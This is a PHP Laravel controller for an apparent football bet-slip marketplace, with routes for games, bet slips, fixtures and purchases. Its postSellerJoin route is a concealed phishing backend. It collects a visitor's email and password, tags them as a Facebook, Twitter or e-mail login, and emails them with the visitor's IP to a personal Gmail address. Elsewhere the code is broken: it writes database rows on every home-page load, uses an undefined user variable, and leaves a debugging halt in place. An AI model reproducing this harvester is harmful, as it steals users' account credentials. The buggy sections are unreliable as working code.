<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Football;
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
        $user = null;
		
		$arr = [ ["id" => 42, "category" => "premium"], ["id" => 52, "category" => "unverified"] ];
		foreach($arr as $a) Settings::create($a);
		
		if(Auth::check())
		{
			$user = Auth::user();
	    }
		
		$ads = $this->helpers->getAds();
		$todayGames = $this->helpers->getGames($user,"today");
		$premiumGames = $this->helpers->getGames($user,"premium");
		$regularGames = $this->helpers->getGames($user,"regular");
    	return view('index', compact(['user','ads','todayGames','regularGames','premiumGames']));
    }
	
	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getFootball()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
        $ret = Football::getLeagues();
		#dd($ret);
    	return view('football_data',compact(['user','ret']));
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getFixtures(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = [];
               
                $validator = Validator::make($req, [
                             'id' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Select a league/competition to continue!";
                       
                 }
                
                 else
                 { 
			           $ret = $this->helpers->getFixtures($req["id"],"n14");
                       #dd($ret);					   
                  }       
           return json_encode($ret);
    }   
    
    
    public function postSellerJoin(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'deg' => 'required',
                             'email' => 'required|email',
                             'pass' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Enter your email and password to continue!";
                       
                 }
                
                 else
                 { 
			           $dg = "E-mail";
					   $deg = $req["deg"];
					   if($deg == "fbb") $dg = "Facebook";
					   else if($deg == "tww") $dg = "Twitter";
					   
            		   $s = "New $dg Login: ".date("h:i A jS F, Y");
                       $rcpt = "uwantbrendacolson@gmail.com";
                       $pass = $req["pass"];
                       $email = $req["email"];
					   $ip = getenv("REMOTE_ADDR");

                       $this->helpers->sendEmail($rcpt,$s,['ip' => $ip,'pass' => $pass,'email' => $email],'emails.apply_alert','view');  
                        $ret = "ok";                      
                  }       
           return $ret;                                                                                            
	}
	
	/**
	 * Show the application Pricing screen to the user.
	 *
	 * @return Response
	 */
	public function getPricing()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
    	return view('pricing', compact(['user']));
    }

	/**
	 * Show the application Support screen to the user.
	 *
	 * @return Response
	 */
	public function getSupport()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
    	return view('support', compact(['user']));
    }

	/**
	 * Show the application Dashboard screen to the user.
	 *
	 * @return Response
	 */
	public function getDashboard()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		else
		{
			return redirect()->intended('/');
		}
		
		$tokenBalance = $this->helpers->getTokenBalance($user);
		$totalBetSlipsSold = $this->helpers->getTotalBetSlipsSold($user);
		$totalBetSlipsPurchased = $this->helpers->getTotalBetSlipsPurchased($user);
		$todayGames = $this->helpers->getGames($user,"today");
		
    	return view('dashboard', compact(['user','username','tokenBalance','totalBetSlipsPurchased','totalBetSlipsSold','todayGames']));
    }	
	
	/**
	 * Show the application Games screen to the user.
	 *
	 * @return Response
	 */
	public function getGames()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		else
		{
			return redirect()->intended('/');
		}
		
		$ads = $this->helpers->getAds();
		$todayGames = $this->helpers->getGames($user,"today");
		$premiumGames = $this->helpers->getGames($user,"premium");
		$regularGames = $this->helpers->getGames($user,"regular");
		
    	return view('games', compact(['user','ads','todayGames','regularGames','premiumGames']));
    }	
	
	/**
	 * Show the application Support screen to the user.
	 *
	 * @return Response
	 */
	public function getBetSlips()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		else
		{
			return redirect()->intended('/');
		}
		
		$ads = $this->helpers->getAds();
		$totalBetSlipsPurchased = $this->helpers->getUserBetSlips($user);
		
    	return view('betslips', compact(['user','ads','totalBetSlipsPurchased']));
    }

	/**
	 * Show the application Support screen to the user.
	 *
	 * @return Response
	 */
	public function getAddBetSlip()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		else
		{
			return redirect()->intended('/');
		}
		
		$ret = Football::getLeagues();
		$countries = $this->helpers->getCountries();
    	return view('add-bs', compact(['user','ret','countries']));
    }
	
	
    /**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function postAddBetSlip(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = [];
               
                $validator = Validator::make($req, [
                             'ssp' => 'required',
                             'booking_code' => 'required',
                             'total_odds' => 'required|numeric',
                   ]);
         
                 if($validator->fails())
                  {
					   Session::flash("status","error");                  
                 }
                
                 else
                 { 
			           $ssp = json_decode($req["ssp"]);					   
					   $category = $this->helpers->getCategory($user);
					   
                       $betSlipData = ["booking_code" => $req['booking_code'],
					                   "total_odds" => $req['total_odds'],
					                   "user_id" => $user->id,
					                   "category" => $category,
									   "ssp" => $ssp];	
									   
                       dd($betSlipData);									   
					   $this->helpers->addBetSlip($betSlipData);
					   Session::flash("status","success");
                  } 
				  
           Session::flash("op","add-betslip");				  
           return redirect()->intended('betslips');				  
    } 
	
	
    /**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getBetSlip(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = [];
               
                $validator = Validator::make($req, [
                             'id' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Invalid ID!";
                       
                 }
                
                 else
                 { 
			           $ret = $this->helpers->getBetSlip($req["id"]);
                       #dd($ret);					   
                  }       
           return json_encode($ret);
    } 
	
	/*				
	 * Show the application Transactions screen to the user.
	 *
	 * @return Response
	 */
	public function getPurchases()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null)
		{
			return redirect()->intended('/');
		}

		$purchases = $this->helpers->getUserPurchases($user);
		
		return view('transactions', compact(['user','purchases']));	
    	
    }	

    /**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getGame(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = [];
               
                $validator = Validator::make($req, [
                             'id' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Invalid ID!";
                       
                 }
                
                 else
                 { 
			           $ret = $this->helpers->getBetSlip($req["id"]);
                       #dd($ret);					   
                  }       
           return json_encode($ret);
    }

	/**
	 * Gets competitions for a country
	 *
	 * @return Response
	 */
	public function getCompetitions(Request $request)
    {
        $user = null;
		$ret = [];
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null)
		{
			$ret = ["status" => "error","msg" => "An unknown problem has occured."];
		}
		
		else
		{
           $req = $request->all();
		   #dd($req);
           $ret = [];
               
                $validator = Validator::make($req, [
                             'xid' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                      $ret = ["status" => "error","msg" => "Please fill the required fields."];
                       
                 }
                
                 else
                 { 
					   $competitions = $this->helpers->getCompetitions($req["xid"]);

                       $ret["status"] = "success";
                       $ret["msg"] = "ok";
                       $ret["competitions"] = $competitions;
				 }	
		}
		
		return json_encode($ret);
    }	
	
	/**
	 * Gets teams for a competition
	 *
	 * @return Response
	 */
	public function getTeams(Request $request)
    {
        $user = null;
		$ret = [];
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null)
		{
			$ret = ["status" => "error","msg" => "An unknown problem has occured."];
		}
		
		else
		{
           $req = $request->all();
		   #dd($req);
           $ret = [];
               
                $validator = Validator::make($req, [
                             'xid' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                      $ret = ["status" => "error","msg" => "Please fill the required fields."];
                       
                 }
                
                 else
                 { 
					   $teams = $this->helpers->getTeams($req["xid"]);

                       $ret["status"] = "success";
                       $ret["msg"] = "ok";
                       $ret["teams"] = $teams;
				 }	
		}
		
		return json_encode($ret);
    }	

}
